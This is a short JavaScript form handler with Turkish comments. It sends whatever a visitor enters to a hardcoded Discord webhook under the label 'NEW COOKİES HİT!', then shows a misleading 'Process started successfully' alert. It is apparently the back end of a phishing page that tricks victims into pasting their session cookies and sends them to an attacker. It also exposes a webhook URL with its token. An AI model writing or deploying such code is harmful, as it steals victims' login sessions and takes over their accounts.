document.getElementById('discordForm').addEventListener('submit', function(e) {
    e.preventDefault(); 

    const mesajGirdisi = document.getElementById('kullaniciMesaji');
    const mesaj = mesajGirdisi.value;

    // Kendi Discord Webhook linkini buraya yapıştır:
    const webhookURL = "https://discord.com/api/webhooks/1517433852908277900/R_qDQkZB2lzxkxk58f7uTgtxXdLBR0OnGmknvGIQMy8VM_nXkuNC2nRB58ufF7HTYqkX";

    const veri = {
        content: `🎮 **NEW COOKİES HİT!** \n> **Girilen Veri:** ${mesaj}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(veri)
    })
    .then(response => {
        if (response.ok) {
            alert('Process started successfully! Please wait.');
            mesajGirdisi.value = ''; 
        } else {
            alert('An error occurred. Please try again.');
        }
    })
    .catch(error => {
        console.error('Hata:', error);
        alert('Connection error.');
    });
});
